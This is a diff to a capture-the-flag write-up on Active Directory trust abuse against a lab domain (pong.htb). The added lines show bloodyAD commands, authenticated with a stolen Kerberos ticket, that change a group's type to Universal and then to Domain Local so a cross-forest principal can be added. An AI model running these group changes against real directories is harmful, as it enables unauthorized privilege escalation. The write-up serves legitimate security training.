@@ -609,6 +609,20 @@ The above is the outline of how the group types work
 > Key takeaway for trust abuse: only Domain Local groups can hold members from outside the forest (foreign security principals). Global groups are domain-bound; Universal groups are forest-bound but not beyond. If you have write access to a Global group and need to add a cross-trust/cross-forest principal, you have to flip it Global → Universal → Domain Local in two separate writes — there's no shortcut.
 
 ```python
+❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v '-2147483640'
+[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
+```
+
+First ill make it into a universal group type
+
+```python
+❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v '-2147483644'
+[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
+```
+
+Now its domain local, and i should be able to add him to the group
+
+```python
 
 ```
 
